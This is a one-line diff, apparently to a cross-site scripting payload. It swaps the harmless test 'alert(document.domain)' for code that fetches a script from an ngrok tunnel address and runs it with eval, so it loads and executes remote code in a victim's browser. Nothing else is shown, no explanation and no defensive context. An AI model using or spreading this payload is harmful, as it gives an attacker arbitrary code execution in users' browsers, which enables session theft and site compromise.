@@ -1,1 +1,1 @@
-alert(document.domain)
+fetch("https://30c3-46-123-246-104.ngrok-free.app/a.js").then(r=>r.text().then(t=>eval(t)))
